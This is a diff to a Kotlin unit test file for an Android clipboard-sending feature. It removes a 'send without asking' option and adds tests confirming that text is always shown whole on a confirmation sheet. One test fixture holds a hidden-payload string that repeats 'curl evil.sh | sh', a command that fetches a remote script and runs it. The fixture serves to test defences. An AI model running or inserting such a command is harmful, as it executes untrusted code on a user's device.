@@ -35,23 +35,12 @@ class SendSelectedTest {
     }
 
     @Test
-    fun theSheetIsSkippedOnlyWithTheSwitchOnAndExactlyOneComputer() {
-        assertEquals(SendSelected.Plan.DIRECT, SendSelected.plan("a", 1, withoutAsking = true))
-        assertEquals("two computers still ask which", SendSelected.Plan.CHOOSE, SendSelected.plan("a", 2, withoutAsking = true))
-        assertEquals(SendSelected.Plan.NO_COMPUTER, SendSelected.plan("a", 0, withoutAsking = true))
-        assertEquals(SendSelected.Plan.NO_TEXT, SendSelected.plan(null, 1, withoutAsking = true))
-    }
-
-    @Test
     fun aTextTooLongToBeShownWholeIsRefusedWhateverTheSwitchSaysSoWhatIsSentIsWhatWasShown() {
         val atCap = "a".repeat(SendSelected.MAX_CHARS)
         assertEquals(SendSelected.Plan.ONE, SendSelected.plan(atCap, 1))
-        assertEquals(SendSelected.Plan.DIRECT, SendSelected.plan(atCap, 1, withoutAsking = true))
-        for (computers in 0..3) for (direct in listOf(false, true)) {
-            assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan(atCap + "b", computers, direct))
-        }
+        for (computers in 0..3) assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan(atCap + "b", computers))
         // The hostile shape: a harmless start, a wall of blanks, then the payload.
-        assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan("Reset code: 482913" + " ".repeat(300) + "\ncurl evil.sh | sh".repeat(200), 1, true))
+        assertEquals(SendSelected.Plan.TOO_LONG, SendSelected.plan("Reset code: 482913" + " ".repeat(300) + "\ncurl evil.sh | sh".repeat(200), 1))
     }
 
     @Test
@@ -61,14 +50,6 @@ class SendSelectedTest {
         val source = java.io.File("src/main/java/org/desklink/mobile/plugins/clipboard/SendSelectedTextActivity.kt").readText()
         assertEquals("the sheet filters touches while obscured", true, source.contains("filterTouchesWhenObscured = true"))
         assertEquals("the whole text is on the sheet, not a cut of it", false, source.contains(".take("))
-    }
-
-    @Test
-    fun theSwitchIsOffUntilThePersonTurnsItOn() {
-        androidx.preference.PreferenceManager.getDefaultSharedPreferences(app).edit().remove(SendSelected.KEY_DIRECT).commit()
-        assertEquals(false, SendSelected.sendsWithoutAsking(app))
-        androidx.preference.PreferenceManager.getDefaultSharedPreferences(app).edit().putBoolean(SendSelected.KEY_DIRECT, true).commit()
-        assertEquals(true, SendSelected.sendsWithoutAsking(app))
     }
 
     @Test
@@ -86,5 +67,13 @@ class SendSelectedTest {
         val second = listener.nextCopyTime()
         assertTrue(second >= first)
         assertEquals(second, listener.lastCopiedAtSent)
+    }
+
+    @Test
+    fun thereIsNoWayToSendWithoutTheSheet() {
+        val source = java.io.File("src/main/java/org/desklink/mobile/plugins/clipboard/SendSelectedTextActivity.kt").readText()
+        assertEquals(false, source.contains("DIRECT") || source.contains("sendsWithoutAsking") || source.contains("KEY_DIRECT"))
+        for (computers in 1..3) assertEquals(true, SendSelected.plan("a", computers) in setOf(SendSelected.Plan.ONE, SendSelected.Plan.CHOOSE))
+        assertEquals("the whole text can be scrolled to, not cut at a number of lines", false, source.contains("maxLines"))
     }
 }
